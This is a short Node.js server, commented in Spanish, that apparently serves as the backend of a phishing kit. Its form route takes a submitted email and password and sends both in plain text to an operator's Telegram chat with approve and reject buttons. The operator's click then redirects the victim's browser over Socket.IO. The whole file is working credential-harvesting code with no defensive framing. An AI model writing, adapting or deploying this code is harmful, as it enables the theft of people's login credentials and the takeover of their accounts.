require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Token del bot desde .env
const token = process.env.BOT_TOKEN;
const bot = new TelegramBot(token, { polling: true });

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Ruta principal para recibir datos del formulario
app.post('/enviar', (req, res) => {
  const { usuario, clave } = req.body;

  // Enviar mensaje al bot con botones inline
  bot.sendMessage(process.env.TELEGRAM_CHAT_ID, 
    `🔐 *Nuevo intento de acceso:*\n\n📧 Correo: *${usuario}*\n🔑 Contraseña: *${clave}*`, {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [{ text: '✅ Aceptar', callback_data: 'aceptar' }],
        [{ text: '❌ Rechazar', callback_data: 'rechazar' }]
      ]
    }
  });

  res.sendStatus(200);
});

// Manejar botones presionados
bot.on('callback_query', (callbackQuery) => {
  const action = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;

  if (action === 'aceptar') {
    bot.sendMessage(chatId, '🟢 ¡Acceso aprobado!');
    if (global.socket) {
      global.socket.emit('redirect', '/bienvenido.html');
    }
  } else if (action === 'rechazar') {
    bot.sendMessage(chatId, '🔴 Acceso denegado.');
    if (global.socket) {
      global.socket.emit('redirect', '/denegado.html');
    }
  }
});

// Socket.IO para comunicar con el navegador
io.on('connection', (socket) => {
  console.log('🟢 Cliente conectado vía Socket.IO');
  global.socket = socket;
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Servidor corriendo en http://localhost:${PORT}`);
});
